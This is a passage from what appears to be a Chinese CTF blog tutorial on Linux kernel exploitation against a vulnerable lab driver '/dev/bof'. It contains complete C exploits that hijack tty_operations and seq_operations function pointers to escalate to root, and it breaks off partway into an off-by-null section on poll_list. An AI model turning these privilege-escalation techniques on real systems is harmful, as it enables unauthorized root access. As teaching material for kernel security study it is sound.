<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir /dev/pts</span><br><span class="line">mount -t devpts none /dev/pts</span><br><span class="line">chmod 777 /dev/ptmx</span><br></pre></td></tr></table></figure></div>

<p>所以我们只需要劫持 <code>tty_ops</code> 的某个可触发的操作即可，将其劫持到 <code>get_root</code> 函数处。</p>
<h3 id="exp-10"><a href="#exp-10" class="headerlink" title="exp"></a>exp</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BOF_MALLOC 5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BOF_FREE 7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BOF_EDIT 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BOF_READ 9</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *(*commit_creds)(<span class="type">void</span> *) = (<span class="type">void</span> *) <span class="number">0xffffffff810a1340</span>;</span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0xFFFFFFFF81E496C0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> user_cs, user_rflags, user_rsp, user_ss, user_rip = (<span class="type">size_t</span>) get_shell;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_rsp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> kernel_offset;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_root</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov rbx, [rsp + 8];&quot;</span></span><br><span class="line">        <span class="string">&quot;mov kernel_offset, rbx;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    kernel_offset -= <span class="number">0xffffffff814f604f</span>;</span><br><span class="line">    commit_creds = (<span class="type">void</span> *) ((<span class="type">size_t</span>) commit_creds + kernel_offset);</span><br><span class="line">    init_cred = (<span class="type">void</span> *) ((<span class="type">size_t</span>) init_cred + kernel_offset);</span><br><span class="line">    commit_creds(init_cred);</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;swapgs;&quot;</span></span><br><span class="line">        <span class="string">&quot;push user_ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;push user_rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;push user_rflags;&quot;</span></span><br><span class="line">        <span class="string">&quot;push user_cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;push user_rip;&quot;</span></span><br><span class="line">        <span class="string">&quot;iretq;&quot;</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">param</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span> len;    <span class="comment">// 内容长度</span></span><br><span class="line">    <span class="type">char</span> *buf;     <span class="comment">// 用户态缓冲区地址</span></span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> idx; <span class="comment">// 表示 ptr 数组的 索引</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> fake_tty_ops[] = &#123;</span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">        get_root</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// len buf idx</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">param</span> <span class="title">p</span> =</span> &#123;<span class="number">0x2e0</span>, <span class="built_in">malloc</span>(<span class="number">0x2e0</span>), <span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]p_addr==&gt;%p\n&quot;</span>, &amp;p);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> bof_fd = open(<span class="string">&quot;/dev/bof&quot;</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line">    p.len = <span class="number">0x2e0</span>;</span><br><span class="line">    ioctl(bof_fd, BOF_MALLOC, &amp;p);</span><br><span class="line">    <span class="built_in">memset</span>(p.buf, <span class="string">&#x27;\xff&#x27;</span>, <span class="number">0x2e0</span>);</span><br><span class="line">    ioctl(bof_fd, BOF_EDIT, &amp;p);</span><br><span class="line">    ioctl(bof_fd, BOF_FREE, &amp;p);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> ptmx_fd = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line">    p.len = <span class="number">0x20</span>;</span><br><span class="line">    ioctl(bof_fd, BOF_READ, &amp;p);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]magic_code==&gt; %p -- %p\n&quot;</span>, &amp;p.buf[<span class="number">0</span>], *(<span class="type">size_t</span> *)&amp;p.buf[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]tty____ops==&gt; %p -- %p\n&quot;</span>, &amp;p.buf[<span class="number">0x18</span>], *(<span class="type">size_t</span> *)&amp;p.buf[<span class="number">0x18</span>]);</span><br><span class="line"></span><br><span class="line">    *(<span class="type">size_t</span> *)&amp;p.buf[<span class="number">0x18</span>] = &amp;fake_tty_ops;</span><br><span class="line">    ioctl(bof_fd, BOF_EDIT, &amp;p);</span><br><span class="line"></span><br><span class="line">    ioctl(ptmx_fd, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="seq-operations-劫持"><a href="#seq-operations-劫持" class="headerlink" title="seq_operations 劫持"></a>seq_operations 劫持</h2><p><strong>boot.sh</strong></p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">  -initrd rootfs.img \</span><br><span class="line">  -kernel bzImage \</span><br><span class="line">  -m 512M \</span><br><span class="line">  -nographic \</span><br><span class="line">  -append <span class="string">&#x27;console=ttyS0 root=/dev/ram oops=panic panic=1 quiet kaslr&#x27;</span> \</span><br><span class="line">  -monitor /dev/null \</span><br><span class="line">  -s \</span><br><span class="line">  -cpu kvm64 \</span><br><span class="line">  -smp cores=1,threads=1 \</span><br><span class="line">  --nographic</span><br></pre></td></tr></table></figure></div>

<h3 id="利用思路-11"><a href="#利用思路-11" class="headerlink" title="利用思路"></a>利用思路</h3><p><code>seq_operations</code> 结构如下，该结构在打开 <code>/proc/self/stat</code> 时从 <code>kmalloc-32</code> 中分配。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line">	<span class="type">void</span> * (*start) (<span class="keyword">struct</span> seq_file *m, <span class="type">loff_t</span> *pos);</span><br><span class="line">	<span class="type">void</span> (*stop) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line">	<span class="type">void</span> * (*next) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v, <span class="type">loff_t</span> *pos);</span><br><span class="line">	<span class="type">int</span> (*show) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>调用读取 <code>stat</code> 文件时会调用 <code>seq_operations</code> 的 <code>start</code> 函数指针。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">seq_read</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">char</span> __user *buf, <span class="type">size_t</span> size, <span class="type">loff_t</span> *ppos)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">seq_file</span> *<span class="title">m</span> =</span> file-&gt;private_data;</span><br><span class="line">	...</span><br><span class="line">	p = m-&gt;op-&gt;start(m, &amp;pos);</span><br><span class="line">	...</span><br></pre></td></tr></table></figure></div>

<p>当我们在 <code>heap_bof</code> 驱动分配 <code>0x20</code> 大小的 <code>object</code> 后打开大量的 <code>stat</code> 文件就有很大概率在 <code>heap_bof</code> 分配的 <code>object</code> 的溢出范围内存在 <code>seq_operations</code> 结构体。由于这道题关闭了 <code>SMEP</code>，<code>SMAP</code> 和 <code>KPTI</code> 保护，因此我们可以覆盖 <code>start</code> 函数指针为用户空间的提权代码实现提权。至于 <code>KASLR</code> 可以通过泄露栈上的数据绕过。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/image-20240922171025707.png"
                      alt="image-20240922171025707"
                ></p>
<h3 id="exp-11"><a href="#exp-11" class="headerlink" title="exp"></a>exp</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">param</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span> len;       <span class="comment">// 内容长度</span></span><br><span class="line">    <span class="type">char</span> *buf;        <span class="comment">// 用户态缓冲区地址</span></span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> idx;<span class="comment">// 表示 ptr 数组的 索引</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> SEQ_NUM = <span class="number">0x200</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> DATA_SIZE = <span class="number">0x20</span> * <span class="number">8</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BOF_MALLOC 5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BOF_FREE 7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BOF_EDIT 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BOF_READ 9</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span> &#123; </span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_rflags, user_sp, user_ss, user_rip = (<span class="type">size_t</span>) get_shell;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *(*commit_creds)(<span class="type">void</span> *) = (<span class="type">void</span> *) <span class="number">0xFFFFFFFF810A1340</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *init_cred = (<span class="type">void</span> *) <span class="number">0xFFFFFFFF81E496C0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> kernel_offset;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_root</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov rax, [rsp + 8];&quot;</span></span><br><span class="line">        <span class="string">&quot;mov kernel_offset, rax;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    kernel_offset -= <span class="number">0xffffffff81229378</span>;</span><br><span class="line">    commit_creds = (<span class="type">void</span> *) ((<span class="type">size_t</span>) commit_creds + kernel_offset);</span><br><span class="line">    init_cred = (<span class="type">void</span> *) ((<span class="type">size_t</span>) init_cred + kernel_offset);</span><br><span class="line">    commit_creds(init_cred);</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;swapgs;&quot;</span></span><br><span class="line">        <span class="string">&quot;push user_ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;push user_sp;&quot;</span></span><br><span class="line">        <span class="string">&quot;push user_rflags;&quot;</span></span><br><span class="line">        <span class="string">&quot;push user_cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;push user_rip;&quot;</span></span><br><span class="line">        <span class="string">&quot;iretq;&quot;</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> bof_fd = open(<span class="string">&quot;dev/bof&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (bof_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Failed to open bof.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">param</span> <span class="title">p</span> =</span> &#123;<span class="number">0x20</span>, <span class="built_in">malloc</span>(<span class="number">0x20</span>), <span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x40</span>; i++) &#123;</span><br><span class="line">        ioctl(bof_fd, BOF_MALLOC, &amp;p);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(p.buf, <span class="string">&#x27;\xff&#x27;</span>, p.len);</span><br><span class="line">    ioctl(bof_fd, BOF_EDIT, &amp;p);</span><br><span class="line">    <span class="type">int</span> seq_fd[SEQ_NUM];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SEQ_NUM; i++) &#123;</span><br><span class="line">        seq_fd[i] = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">        <span class="keyword">if</span> (seq_fd[i] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Failed to open stat.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] seq_operations spray finished.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    p.len = DATA_SIZE;</span><br><span class="line">    p.buf = <span class="built_in">malloc</span>(DATA_SIZE);</span><br><span class="line">    p.idx = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; DATA_SIZE; i += <span class="keyword">sizeof</span>(<span class="type">size_t</span>)) &#123;</span><br><span class="line">        *(<span class="type">size_t</span> *) &amp;p.buf[i] = (<span class="type">size_t</span>) get_root;</span><br><span class="line">    &#125;</span><br><span class="line">    ioctl(bof_fd, BOF_EDIT, &amp;p);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Heap overflow finished.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SEQ_NUM; i++) &#123;</span><br><span class="line">        read(seq_fd[i], p.buf, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="off-by-null"><a href="#off-by-null" class="headerlink" title="off by null"></a>off by null</h2><p>现在我们假设这道题没有提供free，并且只有单字节溢出，并且溢出的单字节只能是<code>NULL</code>，那么我们应该怎麼去利用呢？</p>
<h3 id="利用思路-12"><a href="#利用思路-12" class="headerlink" title="利用思路"></a>利用思路</h3><p><strong>boot.sh</strong></p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">  -initrd rootfs.img \</span><br><span class="line">  -kernel bzImage \</span><br><span class="line">  -m 1G \</span><br><span class="line">  -append <span class="string">&#x27;console=ttyS0 root=/dev/ram oops=panic panic=1 quiet nokaslr&#x27;</span> \</span><br><span class="line">  -monitor /dev/null \</span><br><span class="line">  -s \</span><br><span class="line">  -cpu kvm64 \</span><br><span class="line">  -smp cores=1,threads=2 \</span><br><span class="line">  --nographic</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p><strong>poll系统调用</strong></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">*   @fds: pollfd类型的一个数组</span></span><br><span class="line"><span class="comment">*   @nfds: 前面的参数fds中条目的个数</span></span><br><span class="line"><span class="comment">*   @timeout: 事件发生的毫秒数</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">poll</span><span class="params">(<span class="keyword">struct</span> pollfd *fds, <span class="type">nfds_t</span> nfds, <span class="type">int</span> timeout)</span>;</span><br></pre></td></tr></table></figure></div>

<p><code>poll_list</code> 结构体对象是在调用 <code>poll()</code> 时分配，该调用可以监视 <code>1</code> 个或多个文件描述符的活动。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> &#123;</span></span><br><span class="line">	<span class="type">int</span> fd;</span><br><span class="line">	<span class="type">short</span> events;</span><br><span class="line">	<span class="type">short</span> revents;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">poll_list</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">poll_list</span> *<span class="title">next</span>;</span> <span class="comment">// 指向下一个poll_list</span></span><br><span class="line">    <span class="type">int</span> len; <span class="comment">// 对应于条目数组中pollfd结构的数量</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">entries</span>[];</span> <span class="comment">// 存储pollfd结构的数组</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p><code>poll_list</code> 结构如下图所示，前 <code>30</code> 个 <code>poll_fd</code> 在栈上，后面的都在堆上，最多 <code>510</code> 个 <code>poll_fd</code> 在一个堆上的 <code>poll_list</code> 上，堆上的 <code>poll_list</code> 最大为 <code>0x1000</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/image-20241010143715739.png"
                      alt="image-20241010143715739"
                ></p>
<p><strong>poll_list 分配&#x2F;释放</strong></p>
<p><code>do_sys_poll</code> 函数完成 <code>poll_list</code> 的分配和释放。<code>poll_list</code> 的是超时自动释放的，我们可以指定 <code>poll_list</code> 的释放时间。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span 